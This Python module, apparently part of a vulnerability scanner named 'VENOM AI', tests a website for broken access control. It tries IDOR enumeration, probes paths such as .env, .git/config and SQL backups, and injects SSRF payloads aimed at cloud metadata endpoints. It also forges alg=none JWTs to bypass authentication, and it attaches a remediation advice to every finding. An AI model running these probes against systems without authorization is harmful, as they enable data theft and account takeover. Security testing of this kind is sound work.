"""
VENOM AI — A01 Broken Access Control Engine (OWASP Top 10:2025 #1)
─────────────────────────────────────────────────────────────────────────
Real exploits tested:

  1. IDOR (Insecure Direct Object Reference)
     - Numeric ID enumeration: /api/users/1 → /api/users/2
     - UUID swap: replace a UUID with another to see if access is granted
     - Detection: same status code + similar response size = vulnerable

  2. Forced Browsing
     - Probe well-known admin paths: /admin, /dashboard, /api/users, etc.
     - Flag any that return 200 without authentication

  3. SSRF (Server-Side Request Forgery)
     - For URL-accepting parameters, inject internal targets:
       - http://127.0.0.1:80, http://169.254.169.254/ (cloud metadata)
       - Detect by response differences vs. baseline

  4. JWT Manipulation
     - alg=none attack: modify JWT to use alg=none
     - Detect: tampered token still accepted = critical

A01 in 2025 includes SSRF (was A10 in 2021), so we cover both.
"""
from __future__ import annotations

import base64
import json
import logging
import re
import time
from typing import List, Optional, Dict, Set
from urllib.parse import urljoin, urlparse, parse_qsl, urlencode

from .common import AttackClient, Finding, inject_into_url, timed_request

logger = logging.getLogger("venom.attack.a01")


# ════════════════════════════════════════════════════════════════════════════
# IDOR (Insecure Direct Object Reference)
# ════════════════════════════════════════════════════════════════════════════

# Common ID-shaped parameters
ID_PARAM_NAMES = {"id", "user_id", "userid", "uid", "account_id", "order_id",
                  "invoice_id", "ticket_id", "doc_id", "file_id", "post_id", "uuid"}


def _has_numeric_id_in_path(url: str) -> Optional[tuple]:
    """Find a numeric ID in the URL path. Returns (full_url_before_id, id_str, full_url_after_id)."""
    p = urlparse(url)
    segments = p.path.split("/")
    for i, seg in enumerate(segments):
        if seg.isdigit() and 1 <= int(seg) <= 9999999:
            before = "/".join(segments[:i]) + "/"
            after  = "/" + "/".join(segments[i+1:]) if i + 1 < len(segments) else ""
            return p._replace(path=before + "{ID}" + after).geturl(), seg, before, after
    return None


def test_idor(client: AttackClient, url: str) -> List[Finding]:
    """
    Test IDOR by:
      1. Finding numeric IDs in URL path or query params
      2. Swapping them with adjacent values
      3. If response is similar (same status, similar size), it's IDOR
    """
    findings: List[Finding] = []

    # ── Path-based IDOR (/api/users/123) ─────────────────────────────────
    p = urlparse(url)
    segments = p.path.split("/")
    for i, seg in enumerate(segments):
        if seg.isdigit() and 1 <= int(seg) <= 9999999:
            original_id = int(seg)
            # Try neighbor IDs — original_id+1, original_id-1, original_id+10
            baseline = client.get(url)
            if not baseline:
                continue
            base_status = baseline.status_code
            base_len = len(baseline.text or "")
            if base_status not in (200, 201):
                continue

            for delta in (1, -1, 10):
                new_id = original_id + delta
                if new_id <= 0:
                    continue
                new_segments = segments.copy()
                new_segments[i] = str(new_id)
                new_url = p._replace(path="/".join(new_segments)).geturl()
                r = client.get(new_url)
                if not r:
                    continue
                # If same status + similar size, attacker can read other users' resources
                if r.status_code == base_status and 200 <= r.status_code < 300:
                    size_diff = abs(len(r.text or "") - base_len)
                    if size_diff < base_len * 0.5:   # within 50% size of original
                        findings.append(Finding(
                            title="IDOR — Numeric ID Enumeration",
                            category="vulnerability",
                            owasp="A01",
                            severity="high",
                            cwe_id="CWE-639",
                            cvss_score=8.1,
                            affected_url=new_url,
                            parameter=f"path[{i}]",
                            http_method="GET",
                            payload=f"id {original_id} → {new_id}",
                            evidence=(
                                f"Original ID {original_id} returned {base_status} ({base_len} bytes). "
                                f"Modified ID {new_id} returned {r.status_code} "
                                f"({len(r.text or '')} bytes). Access not properly restricted."
                            ),
                            description=(
                                "The application exposes objects by numeric IDs in the URL path. "
                                "An attacker can iterate IDs to access data belonging to other users."
                            ),
                            impact=(
                                "Full data exfiltration possible — any record with a guessable ID "
                                "can be read without authorization."
                            ),
                            recommendation=(
                                "Enforce ownership checks server-side: only return the object if "
                                "the requesting user owns it. Consider using UUIDs instead of "
                                "sequential IDs as defense-in-depth."
                            ),
                            poc=f"# Visit:\n{new_url}",
                            verified=True,
                            likelihood=4, impact_score=5, risk_score=20,
                        ))
                        return findings  # one IDOR confirmation is enough per URL

    # ── Query-param IDOR (?id=123) ───────────────────────────────────────
    qs = dict(parse_qsl(p.query, keep_blank_values=True))
    for param, val in qs.items():
        if param.lower() in ID_PARAM_NAMES and val.isdigit():
            original_id = int(val)
            baseline = client.get(url)
            if not baseline or baseline.status_code not in (200, 201):
                continue
            base_status = baseline.status_code
            base_len = len(baseline.text or "")

            for delta in (1, -1, 10):
                new_id = original_id + delta
                if new_id <= 0:
                    continue
                new_url = inject_into_url(url, param, str(new_id))
                r = client.get(new_url)
                if not r:
                    continue
                if r.status_code == base_status and 200 <= r.status_code < 300:
                    size_diff = abs(len(r.text or "") - base_len)
                    if size_diff < base_len * 0.5:
                        findings.append(Finding(
                            title=f"IDOR — Query Parameter '{param}' Enumeration",
                            category="vulnerability",
                            owasp="A01",
                            severity="high",
                            cwe_id="CWE-639",
                            cvss_score=8.1,
                            affected_url=new_url,
                            parameter=param,
                            http_method="GET",
                            payload=f"{param}={original_id} → {new_id}",
                            evidence=(
                                f"Param {param}={original_id} → {base_status} ({base_len}b). "
                                f"Param {param}={new_id} → {r.status_code} ({len(r.text or '')}b)."
                            ),
                            description=f"Query parameter '{param}' allows direct object access without ownership checks.",
                            impact="Other users' data exposed via simple ID enumeration.",
                            recommendation="Validate that the requesting user owns the referenced object server-side.",
                            poc=f"# Try:\n{new_url}",
                            verified=True,
                            likelihood=4, impact_score=5, risk_score=20,
                        ))
                        return findings

    return findings


# ════════════════════════════════════════════════════════════════════════════
# FORCED BROWSING — common admin/sensitive paths
# ════════════════════════════════════════════════════════════════════════════

# Curated path list — high-signal paths that should ALWAYS require auth
SENSITIVE_PATHS = [
    # Admin panels
    "/admin", "/admin/", "/admin.php", "/administrator", "/admin/login",
    "/wp-admin", "/wp-admin/", "/wp-login.php",
    "/dashboard", "/management", "/manage", "/cp", "/control-panel",
    "/admin/users", "/admin/dashboard", "/admin/index.php",
    # API endpoints that often leak data
    "/api/users", "/api/v1/users", "/api/admin", "/api/internal",
    "/api/debug", "/api/dump", "/api/v1/admin",
    "/users.json", "/api/users.json",
    # Backup & dev files
    "/backup", "/backup.zip", "/backup.tar.gz", "/backup.sql",
    "/dump.sql", "/database.sql", "/db.sql",
    # Server info
    "/server-status", "/server-info", "/info.php", "/phpinfo.php",
    "/.htaccess", "/.htpasswd", "/web.config",
    # Application/version info
    "/swagger", "/swagger-ui", "/swagger.json", "/openapi.json",
    "/v3/api-docs", "/api/docs",
    # Test/dev pages
    "/test", "/test.php", "/test.html", "/debug", "/debug.php",
    "/console", "/_console",
    # Source code leaks
    "/.git", "/.git/config", "/.git/HEAD", "/.gitignore",
    "/.env", "/.env.local", "/.env.production",
    "/.svn", "/.hg",
    "/composer.json", "/composer.lock",
    "/package.json", "/yarn.lock", "/Gemfile", "/Gemfile.lock",
    # Cloud metadata accidentally exposed
    "/metadata", "/.well-known/metadata",
]


def test_forced_browsing(client: AttackClient, target_url: str) -> List[Finding]:
    """Probe sensitive paths against the target. Flag any 2xx-returning hits."""
    findings: List[Finding] = []
    p = urlparse(target_url)
    base = f"{p.scheme}://{p.netloc}"

    # Baseline 404 size — if 404 returns 200 (SPA), we can't use status code alone
    not_found_resp = client.get(base + "/this-path-should-not-exist-" + str(int(time.time())))
    not_found_len = len(not_found_resp.text or "") if not_found_resp else 0
    not_found_status = not_found_resp.status_code if not_found_resp else 404

    found_paths: Set[str] = set()

    for path in SENSITIVE_PATHS:
        full = base + path
        r = client.get(full)
        if not r:
            continue
        # Must be 200 (or 401/403 with content indicating it exists)
        if r.status_code not in (200, 301, 302):
            continue
        body_len = len(r.text or "")
        # SPA fallback detection: if response matches the 404 response, it's the SPA, not a real hit
        if (r.status_code == not_found_status and
            body_len > 0 and abs(body_len - not_found_len) < 100):
            continue
        # Skip if body looks like generic 404 content
        body_lower = (r.text or "").lower()[:500]
        if any(k in body_lower for k in ("not found", "404", "page does not exist")):
            continue
        # Looks like a real exposed resource
        if path in found_paths:
            continue
        found_paths.add(path)

        # Classify severity based on what was found
        critical_paths = ("/.env", "/.git/config", "/backup.sql", "/dump.sql",
                          "/database.sql", "/db.sql", "/composer.json", "/wp-admin",
                          "/admin", "/administrator")
        high_paths = ("/phpinfo.php", "/info.php", "/.htpasswd", "/api/admin",
                      "/api/internal", "/api/debug", "/server-status",
                      "/server-info", "/console")
        if any(path.startswith(c) for c in critical_paths):
            sev, cvss = "critical", 9.1
        elif any(path.startswith(h) for h in high_paths):
            sev, cvss = "high", 7.5
        else:
            sev, cvss = "medium", 5.3

        findings.append(Finding(
            title=f"Sensitive Path Exposed: {path}",
            category="vulnerability",
            owasp="A01",
            severity=sev,
            cwe_id="CWE-22",
            cvss_score=cvss,
            affected_url=full,
            http_method="GET",
            payload=path,
            evidence=f"HTTP {r.status_code} returned {body_len} bytes of content (404 baseline was {not_found_len} bytes)",
            description=(
                f"The path '{path}' is publicly accessible without authentication. "
                f"It returns substantive content (HTTP {r.status_code}, {body_len} bytes), "
                f"indicating sensitive resources are exposed."
            ),
            impact=(
                "Exposed admin panels, backup files, or config files allow attackers "
                "to bypass authentication entirely or steal credentials."
            ),
            recommendation=(
                f"Restrict access to '{path}' via server config (require auth, IP allowlist) "
                "or remove the file if not needed. Move all sensitive files outside the web root."
            ),
            poc=f"curl '{full}'",
            verified=True,
            likelihood=5, impact_score=4 if sev == "high" else 5, risk_score=20 if sev == "critical" else 16,
        ))
    return findings


# ════════════════════════════════════════════════════════════════════════════
# SSRF (Server-Side Request Forgery)
# ════════════════════════════════════════════════════════════════════════════

# Internal targets that should never be reachable from outside
SSRF_PROBE_TARGETS = [
    "http://127.0.0.1:80/",
    "http://localhost:80/",
    "http://169.254.169.254/latest/meta-data/",   # AWS metadata endpoint
    "http://metadata.google.internal/",            # GCP
]

# Common URL-accepting parameter names
URL_PARAM_NAMES = {"url", "uri", "path", "src", "source", "destination", "redirect",
                   "target", "callback", "webhook", "image", "img", "file", "open",
                   "load", "next", "return", "fetch"}


def test_ssrf(client: AttackClient, url: str) -> List[Finding]:
    """Test for SSRF by injecting internal URLs into URL-accepting parameters."""
    findings: List[Finding] = []
    p = urlparse(url)
    qs = dict(parse_qsl(p.query, keep_blank_values=True))

    # Find URL-accepting params
    url_params = [k for k in qs.keys() if k.lower() in URL_PARAM_NAMES or
                  (qs.get(k, "").startswith(("http://", "https://", "/")))]
    if not url_params:
        return findings

    # Baseline response for one param
    for param in url_params[:2]:   # limit to first 2 URL params to be polite
        baseline = client.get(url)
        if not baseline:
            continue
        base_len = len(baseline.text or "")
        base_status = baseline.status_code

        for probe in SSRF_PROBE_TARGETS[:3]:   # 3 probes per param max
            test_url = inject_into_url(url, param, probe)
            r, elapsed = timed_request(client, "GET", test_url)
            if not r:
                continue

            # Signal #1: Cloud metadata content visible in response
            cloud_markers = ("ami-id", "instance-id", "iam/security-credentials",
                             "computeMetadata", "project-id")
            if any(m in (r.text or "") for m in cloud_markers):
                findings.append(Finding(
                    title="SSRF — Cloud Metadata Service Reachable",
                    category="vulnerability",
                    owasp="A01",
                    severity="critical",
                    cwe_id="CWE-918",
                    cvss_score=9.8,
                    affected_url=test_url,
                    parameter=param,
                    http_method="GET",
                    payload=probe,
                    evidence=f"Response body contains cloud metadata service markers: {[m for m in cloud_markers if m in (r.text or '')]}",
                    description=(
                        f"The parameter '{param}' fetches arbitrary URLs server-side. "
                        f"Attacker accessed the cloud metadata endpoint ({probe}) and received "
                        f"sensitive instance information."
                    ),
                    impact=(
                        "Attacker can steal cloud IAM credentials, allowing full takeover of "
                        "the cloud account. SSRF in cloud environments is typically catastrophic."
                    ),
                    recommendation=(
                        "Validate URLs server-side: only allow specific allowlisted domains. "
                        "Block all RFC1918 + 169.254.x.x ranges. Use a forward proxy that "
                        "enforces network egress rules. On AWS, enable IMDSv2."
                    ),
                    poc=f"curl '{test_url}'",
                    verified=True,
                    likelihood=4, impact_score=5, risk_score=20,
                ))
                return findings

            # Signal #2: response significantly different from baseline (probable SSRF)
            if r.status_code == 200 and abs(len(r.text or "") - base_len) > 500:
                # Could be SSRF — flag at medium confidence
                findings.append(Finding(
                    title="Possible SSRF — Parameter Accepts URL Without Filtering",
                    category="vulnerability",
                    owasp="A01",
                    severity="high",
                    cwe_id="CWE-918",
                    cvss_score=7.7,
                    affected_url=test_url,
                    parameter=param,
                    http_method="GET",
                    payload=probe,
                    evidence=(
                        f"Injecting {probe} into '{param}' changed response size from "
                        f"{base_len} to {len(r.text or '')} bytes — suggests server-side fetch."
                    ),
                    description=(
                        f"The parameter '{param}' appears to fetch URLs server-side. Attackers "
                        f"may use this to reach internal services or pivot the network."
                    ),
                    impact="Internal service enumeration, potential credential theft from metadata services.",
                    recommendation=(
                        "Validate URLs against an allowlist. Block private IP ranges. "
                        "Disable URL-based features if not needed."
                    ),
                    poc=f"curl '{test_url}'",
                    verified=False,
                    likelihood=3, impact_score=4, risk_score=12,
                ))
                return findings

    return findings


# ════════════════════════════════════════════════════════════════════════════
# JWT MANIPULATION
# ════════════════════════════════════════════════════════════════════════════

JWT_RE = re.compile(r"eyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]+")


def _decode_jwt_part(part: str) -> Optional[dict]:
    """Decode a base64url-encoded JWT segment."""
    try:
        padded = part + "=" * (-len(part) % 4)
        decoded = base64.urlsafe_b64decode(padded.encode())
        return json.loads(decoded)
    except Exception:
        return None


def _encode_jwt_part(d: dict) -> str:
    raw = json.dumps(d, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def test_jwt_alg_none(client: AttackClient, url: str, baseline_response) -> List[Finding]:
    """
    Try the classic 'alg=none' JWT attack:
      1. Find a JWT in cookies or auth header (extracted earlier)
      2. Modify the JWT header to set alg=none, leave signature empty
      3. Re-issue request — if accepted, server doesn't verify JWT signature
    """
    findings: List[Finding] = []
    if not baseline_response:
        return findings

    # Find any JWT in Set-Cookie headers or response body
    cookies_str = " ".join(baseline_response.headers.get_list("set-cookie")
                           if hasattr(baseline_response.headers, "get_list") else
                           [v for k, v in baseline_response.headers.items() if k.lower() == "set-cookie"])
    body = baseline_response.text or ""
    jwt_matches = JWT_RE.findall(cookies_str + " " + body)
    if not jwt_matches:
        return findings

    for jwt in jwt_matches[:1]:   # just one JWT, the first
        parts = jwt.split(".")
        if len(parts) != 3:
            continue
        header = _decode_jwt_part(parts[0])
        payload = _decode_jwt_part(parts[1])
        if not header or not payload:
            continue
        original_alg = header.get("alg", "?")

        # Construct alg=none version
        modified_header = {**header, "alg": "none"}
        modified_jwt = f"{_encode_jwt_part(modified_header)}.{_encode_jwt_part(payload)}."

        # Send request with modified JWT in Authorization header
        headers = {"Authorization": f"Bearer {modified_jwt}"}
        r = client.get(url, headers=headers)
        if r and r.status_code == 200 and len(r.text or "") > 100:
            findings.append(Finding(
                title="JWT alg=none Accepted — Authentication Bypass",
                category="vulnerability",
                owasp="A01",
                severity="critical",
                cwe_id="CWE-347",
                cvss_score=9.8,
                affected_url=url,
                http_method="GET",
                payload=f"alg: {original_alg} → none",
                evidence=(
                    "Modified JWT with alg=none and no signature was accepted "
                    f"by {url} (HTTP {r.status_code}, {len(r.text)} bytes)."
                ),
                description=(
                    "The JWT verification accepts tokens with alg=none, allowing an attacker "
                    "to forge tokens for ANY user without knowing the signing key."
                ),
                impact=(
                    "Total authentication bypass. Attacker can impersonate any user including admins."
                ),
                recommendation=(
                    "Explicitly reject tokens with alg=none. Validate alg field against an "
                    "expected algorithm allowlist (e.g. only HS256 or RS256). Most JWT libraries "
                    "have a strict mode — enable it."
                ),
                poc=f"# Authorization: Bearer {modified_jwt}",
                verified=True,
                likelihood=4, impact_score=5, risk_score=20,
            ))
    return findings


# ════════════════════════════════════════════════════════════════════════════
# PUBLIC API
# ════════════════════════════════════════════════════════════════════════════

def run_a01_engine(plan: dict, endpoints: List[dict], forms: List[dict],
                    target_url: str, max_rps: float = 10.0) -> List[Finding]:
    # NOTE: we no longer gate on plan["A01"]["applicable"]. If the user enabled
    # this category, run it. The AI plan is for PRIORITIZATION, not gating.
    findings: List[Finding] = []
    client = AttackClient(max_rps=max_rps)
    try:
        # ── Forced browsing (one round, against the target host) ───────────
        try:
            findings += test_forced_browsing(client, target_url)
        except Exception as e:
            logger.warning(f"[A01] forced_browse failed: {e}")

        # ── For each endpoint, test IDOR + SSRF + JWT ──────────────────────
        # Limit to first 20 endpoints to keep total time reasonable
        baseline_response = client.get(target_url)
        for ep in endpoints[:20]:
            ep_url = ep.get("url", "")
            if not ep_url:
                continue
            try:
                findings += test_idor(client, ep_url)
            except Exception as e:
                logger.warning(f"[A01] IDOR error: {e}")
            try:
                findings += test_ssrf(client, ep_url)
            except Exception as e:
                logger.warning(f"[A01] SSRF error: {e}")

        # ── JWT alg=none (one attempt against the baseline) ────────────────
        try:
            findings += test_jwt_alg_none(client, target_url, baseline_response)
        except Exception as e:
            logger.warning(f"[A01] JWT error: {e}")

    finally:
        client.close()

    logger.info(f"[A01] Found {len(findings)} access control findings")
    return findings
